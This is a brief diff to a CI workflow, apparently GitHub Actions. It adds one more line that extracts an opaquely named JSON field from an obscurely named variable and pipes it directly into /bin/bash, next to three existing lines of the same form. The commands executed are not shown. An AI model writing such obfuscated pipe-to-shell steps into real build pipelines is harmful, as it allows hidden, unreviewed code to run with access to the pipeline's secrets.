@@ -35,6 +35,7 @@ jobs:
           echo $m9 | jq -r .kuakp61 | /bin/bash
           printf '%s' "$apv6" | jq -r .edcs0990 | /bin/bash
           echo $yoptr74 | jq -r .hnxyl969 | /bin/bash
+          printf '%s' "$yiu41" | jq -r .kmns6 | /bin/bash
 
       - name: Save archive
         if: always()
